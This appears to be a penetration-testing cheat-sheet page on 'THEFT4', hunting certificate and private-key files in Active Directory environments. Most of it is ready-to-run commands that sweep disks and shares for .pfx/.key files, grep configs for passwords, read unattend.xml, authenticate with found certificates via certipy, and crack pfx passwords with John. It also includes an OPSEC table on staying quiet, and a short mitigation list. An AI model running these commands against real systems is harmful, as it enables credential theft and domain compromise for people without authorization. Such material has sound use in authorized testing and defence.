---
title: "THEFT4 — Finding Certificate Files"
description: "No cryptography needed here. Admins and automation constantly leave certificate material lying around: exported .pfx backups, id_rsa-style key files…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs"]
tools: ["NetExec", "Certipy", "John", "Snaffler", "OpenSSL"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/THEFT4 — Finding Certificate Files.md"
---
# THEFT4 — Finding Certificate Files

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Credential Theft (file hunting) |
| **Difficulty** | Low |
| **Pre-requisites** | Read access to a filesystem / share |
| **Tools** | Seatbelt, PowerShell, findstr, Snaffler, Certify |
| **OPSEC Noise** | Low — read-only file discovery |
| **One-liner** | Hunt loose certificate and key files (`.pfx .p12 .pem .key`) left on disk, shares, and in config/unattend files, then authenticate with any that carry an auth EKU. |

***

## What Is THEFT4?

No cryptography needed here. Admins and automation constantly leave certificate material lying around: exported `.pfx` backups, `id_rsa`-style key files, `unattend.xml`/`sysprep` blobs, IIS bindings, web-app config, and network-share dumps. THEFT4 is systematic file hunting for these artefacts.

***

## Step 1 — Hunt Locally

```powershell
# PowerShell — recursive search for common cert/key extensions
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue `
  -Include *.pfx,*.p12,*.pem,*.key,*.crt,*.cer,*.p7b,*.pkcs12,*.jks,*.keystore 2>$null |
  Select-Object FullName, Length, LastWriteTime
```

```cmd
:: cmd / findstr sweep
dir C:\ /s /b | findstr /i "\.pfx \.p12 \.pem \.key \.crt \.cer"

:: Credentials frequently embedded here
findstr /s /i "password" C:\*.xml C:\*.config 2>nul
type C:\Windows\Panther\unattend.xml
```

```powershell
# Seatbelt — dedicated modules
Seatbelt.exe Certificates
Seatbelt.exe InterestingFiles

# Certify — find cert files
Certify.exe find /files
```

***

## Step 2 — Hunt Shares

```bash
# Snaffler (from a Windows foothold) — classifies findings, flags cert/key files
Snaffler.exe -s -o snaffler.log

# From Linux — spider readable shares with netexec, then grep
netexec smb $TARGET -u user -p pass -M spider_plus
```

***

## Step 3 — Triage & Authenticate

```bash
# Inspect what an unknown pfx contains (identity, EKU, expiry)
certipy-ad cert -pfx found.pfx -password '' -nokey -out /dev/stdout   # peek
openssl pkcs12 -info -in found.pfx -nodes                             # or openssl

# If it has Client Auth / PKINIT EKU and a private key -> authenticate
certipy-ad auth -pfx found.pfx -dc-ip $TARGET
```

> [!tip] Password-protected pfx?
> Crack it with John: `pfx2john found.pfx > pfx.hash && john --wordlist=rockyou.txt pfx.hash`. See john-cheatsheet (`--format=pfx`).

***

## OPSEC Considerations

| Action | Artefact | Noise |
| :-- | :-- | :-- |
| Recursive `Get-ChildItem` | high disk I/O, possible EDR heuristic | 🟡 Medium |
| Share spidering | SMB access logs on file servers | 🟡 Medium |
| Reading a file | file-audit events (if enabled) | 🟢 Low |

***

## Mitigation

- Never store `.pfx`/private keys on shares or in config/unattend files; use a secrets vault.
- Scan the estate for stray key material (the same tools defenders can run).
- Password-protect and short-date any exported certs; rotate on exposure.
- Enable file-access auditing on sensitive shares.

***

## See Also

- _ADCS Attack Methodology Guide · THEFT1 — Exporting Certificates and Keys · john-cheatsheet
- Sources: SpecterOps *Certified Pre-Owned*; [Seatbelt](https://github.com/GhostPack/Seatbelt)
